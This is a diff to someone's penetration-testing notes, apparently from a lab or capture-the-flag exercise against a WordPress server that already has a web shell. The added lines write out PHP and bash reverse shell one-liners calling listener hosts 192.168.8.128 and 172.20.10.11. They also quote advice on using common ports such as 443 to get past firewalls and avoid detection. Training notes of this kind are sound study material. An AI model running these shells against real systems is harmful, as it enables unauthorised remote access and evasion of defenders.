@@ -617,4 +617,45 @@ Decison
 		drwxr-xr-x    2 33       33           4096 Jun 10  2021 wordpress
 
 	- I downloaded buch of these files, couldn't find anythong suspicious yet. Need to keep digging.
+		- Couldn't find anything other than what I could already see in the web shell.
+		
+	- At this point I'm going to try to do another reverse shell.
+		- echo '<?php $sock=fsockopen("192.168.8.128",1337);$proc=proc_open("/bin/bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);?>' > cmd3.php
+		- This didn't work, probably because this was not meant to run as a script, but please verify
+		  later.
+		  
+	- I'm going to use a full php script shell now.
+		- This didn't even create the file. Probably because the character length of the url exceeded what the server could
+		  handle (Assumption!)
+	
+	- I'm going to see if I can execute a simple php script to ensure if new php files can be executed. 
+	  If not that would mean we only can execute the busque.php file, but that would be rediculous. 
+	 	- echo '<?php phpinfo() ?>' > test.php
+	 		- This worked!!!
+	 		
+	 	- Let's move to a more practical example.
+	 		- echo '<?php $sock=fsockopen("172.20.10.11",1337);print $sock;?>' > test.php
+	 	
+	 		
+	- Using bash reverse shell
+		- /bin/bash -c 'bash -i >& /dev/tcp/172.20.10.11/443 0>&1'
+		
+ - THE MISTAKE I MADE:
+ 
+ 	I used 1337 as the listening port but if the host machine is firewalled, it might be blocking outbound
+ 	connections from unknown ports by default. There is a higher chance to connect using common ports such as
+ 	80,443 etc because the chances the firewall allows these ports are high.
+ 	
+ 	Explanation from https://tcm-sec.com/things-to-try-when-your-reverse-shell-fails/
+ 	
+"Many of us are use ports like 4444 and 1337 for our shells. This is a common mistake as generally a hardened environment won’t allow traffic to flow over uncommon ports without a good reason (deny bt default). If we’re using a reverse shell, it’s usually best to use common ports (80, 443, 8080, 139, 445) that services are running on as it’s more likely traffic will be allowed. If you’re using a bind shell, you’ll need to test for ports you have permission to open a listener on, as well as allowing traffic to connect to.
 
+For red teamers that are trying to evade detection, OpSec is important. Using ports like 1337 is a great way to get caught by the blue team.
+
+Therefore, it’s considered good practice to use common ports like 80, 443, etc. for your shells."
+
+Observation
+-----------
+
+ - After a few times if the webshell doesn't connect to nc, this is probably because the browser cached the
+   get request. Try using incognito mode.
